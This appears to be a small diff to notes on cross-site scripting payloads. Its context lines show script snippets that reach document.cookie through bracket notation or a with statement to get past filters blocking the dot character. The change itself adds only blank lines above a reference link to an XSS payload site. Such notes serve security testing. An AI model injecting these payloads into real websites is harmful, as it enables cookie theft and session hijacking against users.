@@ -271,4 +271,7 @@ If the dot character is being blocked, you can use other methods to perform dere
 <script>alert(document[‘cookie’])</script>
 <script>with(document)alert(cookie)</script>
 ```
+ 
+ 
+ 
 References: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwim7cD06oL5AhWZk4kEHcDGAzMQFnoECAYQAQ&url=http%3A%2F%2Fwww.xss-payloads.com%2F&usg=AOvVaw1-hKbfrHEIcldlShn1bjoC
